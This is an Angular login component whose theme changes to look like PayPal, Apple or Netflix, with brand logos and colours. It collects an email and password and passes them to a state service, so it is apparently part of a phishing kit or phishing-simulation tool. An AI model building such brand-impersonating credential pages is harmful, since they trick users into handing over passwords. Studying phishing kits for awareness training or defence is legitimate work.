import { Component, inject, computed, signal, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()'
  },
  template: `
    <div class="login-page-content animate-in slide-in-from-bottom-4 duration-500">
      
      <!-- Logo Header (context aware) -->
      @if (showLogo()) {
         <div class="mb-8 text-center">
            <img [src]="logoPath()" class="h-12 mx-auto" alt="Logo">
         </div>
      }

      <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false">
        
        <!-- Header Content -->
        <div class="text-center mb-6">
           <h1 class="text-2xl font-bold mb-2 tracking-tight" [style.color]="headerColor()">
             {{ 'LOGIN.TITLE' | translate }}
           </h1>
           <p class="text-base opacity-80" [style.color]="textColor()">
             {{ 'LOGIN.SUBTITLE' | translate }}
           </p>
        </div>

        <!-- Login Form -->
        <form (submit)="onSubmit($event)" class="space-y-6">
           
           <!-- Email/User Input -->
           <ui-input
              [label]="'LOGIN.EMAIL_LABEL' | translate"
              type="email"
              [(ngModel)]="email"
              name="email"
              [placeholder]="'LOGIN.EMAIL_PLACEHOLDER' | translate"
              [error]="touched() && !email ? 'Required' : ''"
              (blur)="touched.set(true)"
              [iconLeft]="true">
              <span slot="icon-left">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
                  </svg>
              </span>
           </ui-input>
           
           <!-- Password Input -->
           <ui-input
              [label]="'LOGIN.PASSWORD_LABEL' | translate"
              type="password"
              [(ngModel)]="password"
              name="password"
              [placeholder]="'LOGIN.PASSWORD_PLACEHOLDER' | translate"
              [error]="touched() && !password ? 'Required' : ''"
              (blur)="touched.set(true)"
              [iconLeft]="true">
               <span slot="icon-left">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
                  </svg>
               </span>
           </ui-input>

           <!-- Actions -->
           <div class="flex items-center justify-between text-sm">
              <label class="flex items-center gap-2 cursor-pointer opacity-80 hover:opacity-100 transition-opacity">
                 <input type="checkbox" [(ngModel)]="rememberMe" name="rememberMe" class="rounded text-blue-600 focus:ring-blue-500">
                 <span [style.color]="textColor()">{{ 'LOGIN.REMEMBER' | translate }}</span>
              </label>
              
              <a href="#" class="font-medium hover:underline" [style.color]="primaryColor()">
                 {{ 'LOGIN.FORGOT' | translate }}
              </a>
           </div>

           <!-- Submit Button -->
           <ui-button 
             type="submit"
             [loading]="isLoading()"
             [fullWidth]="true"
             [variant]="primaryBtnVariant()">
             {{ 'LOGIN.BUTTON' | translate }}
           </ui-button>

        </form>

        <!-- Footer Slot for Card -->
        <!-- Optional: Could put signup link or branding here -->
        <div class="mt-6 pt-6 border-t border-gray-100 dark:border-gray-800">
             <div class="text-center">
                 <p class="text-sm text-gray-500 mb-3">New to the service?</p>
                 <ui-button 
                   variant="ghost" 
                   [fullWidth]="true"
                   (click)="onSignup()">
                   {{ 'LOGIN.SIGNUP' | translate }}
                 </ui-button>
             </div>
        </div>

      </ui-card>

    </div>
  `,
  styles: [`
    :host { display: block; width: 100%; }
    :host[data-theme='netflix'] {
        --bg-context: #000000;
        --surface: #141414;
        --text-primary: #ffffff;
    }
    :host[data-theme='apple'] {
        --bg-context: #ffffff;
    }
  `]
})
export class LoginComponent {
  state = inject(StateService);
  router = inject(Router);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');

  // Form Model
  email = '';
  password = '';
  rememberMe = false;

  // UI State
  isLoading = signal(false);
  touched = signal(false);

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || 'inherit');
  textColor = computed(() => this.theme()?.input.textColor || 'inherit');
  primaryColor = computed(() => this.theme()?.button.background || '#003087');

  // Logic Computeds
  showLogo = computed(() => ['paypal', 'apple', 'netflix'].includes(this.currentFlowId()));
  logoPath = computed(() => `assets/images/logos/${this.currentFlowId()}-logo.svg`);

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    // Logic for flat vs elevated cards based on theme
    return 'elevated';
  });

  onSubmit(event: Event) {
    event.preventDefault();
    if (this.email && this.password) {
      this.isLoading.set(true);
      // Navigate to next step via state service
      this.state.login(this.email, this.password);
    } else {
      this.touched.set(true);
    }
  }

  onSignup() {
    // No OP for this flow usually, or redirect
  }
}
